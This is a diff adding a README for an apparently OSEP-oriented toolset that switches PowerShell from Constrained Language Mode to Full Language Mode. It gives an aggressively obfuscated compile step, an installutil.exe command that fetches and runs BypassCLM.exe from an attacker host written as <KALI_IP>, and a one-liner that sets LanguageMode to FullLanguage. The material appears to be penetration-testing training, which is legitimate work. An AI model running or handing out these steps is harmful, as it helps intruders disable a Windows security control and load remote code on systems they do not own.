@@ -1,0 +1,40 @@
+# OSEP PowerShell CLM Bypass Toolset
+
+This toolset attempts to switch a PowerShell session from Constrained Language Mode (CLM) to Full Language Mode.
+
+### WHY USE THIS?
+- **CLM Restrictions**: In CLM, many powerful PowerShell features (Win32 API calls, Reflection, certain objects) are blocked.
+- **The Bypass**: Since CLM is a state managed by the current PowerShell Runspace, a C# assembly running inside that same process can use reflection to reach into the internal memory and flip the `_languageMode` variable back to `FullLanguage`.
+
+### PREREQUISITES
+- **Execution Context**: You must be able to run a C# assembly (e.g., via `installutil.exe` or `Assembly.Load()`).
+- **Permissions**: Works at **MEDIUM INTEGRITY**. Admin is not strictly required to modify your own session's state.
+
+---
+
+### OPTION 1: C# (Bypass-CLM.cs) - RECOMMENDED
+The most reliable method. Since `installutil.exe` runs a .NET process, it bypasses CLM by default, but this tool is useful if you want to fix a session that is already constrained.
+
+#### STEP 1: Compile
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/AVDisarm/Bypass-CLM/Bypass-CLM.cs \
+    -m classic \
+    --obfuscate aggressive \
+    -o BypassCLM.exe
+
+#### STEP 2: Execute (via AssemblyLoader)
+C:\...>installutil.exe /U /URL=http://<KALI_IP>/BypassCLM.exe AssemblyLoader.exe
+
+---
+
+### OPTION 2: PowerShell One-Liner
+If you have a terminal open and want to try a quick fix (rarely works in hardened CLM but worth a try):
+
+$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
+
+---
+
+### VERIFICATION
+In your PowerShell session, check the mode:
+PS> $ExecutionContext.SessionState.LanguageMode
+# Should return 'FullLanguage'
